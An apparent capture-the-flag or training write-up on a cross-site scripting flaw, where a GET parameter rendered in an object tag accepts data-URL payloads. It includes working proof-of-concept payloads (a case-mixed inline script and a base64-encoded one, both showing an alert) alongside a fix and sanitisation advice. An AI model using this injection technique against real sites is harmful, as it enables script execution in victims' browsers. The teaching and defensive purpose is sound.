# Cross-Site Scripting (Object)

The `src` GET parameter is used to display content with an `object` tag, thus, we can modify `src` to execute code on our target computer through a simple link `a`.

## How-To

1. Go to `/?page=media&src=nsa`
1. Replace the `src` in url with a page path `/` name

	```
	# Will display Home page
	src=/
	```

1. Replace the `src` in url with an inline script

	```
	# Code will be executed
	data:text/html,<sCrIpt>alert('hi');</scriPt>
	```

1. Replace the `src` in url with a base64 encoded script

	```
	data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGkiKTwvc2NyaXB0Pg==
	```

## Fix

- Use `img` tag instead of `object`

	```html
	<img src='path/to/image.jpg' alt='NSA Logo' />
	```

## Details

- GET parameter are easily modifiable by users, so treat them like any user's input, they are NOT safe, sanitize / validate them !

## Resources

- MDN : [<object>](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object)
- Wiki : [DataURL](https://en.wikipedia.org/wiki/Data_URI_scheme)
- MDN : [DataURL](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs)
- Wiki : [Base64](https://en.wikipedia.org/wiki/Base64)
- Encode : [Base64](https://www.base64decode.org/)
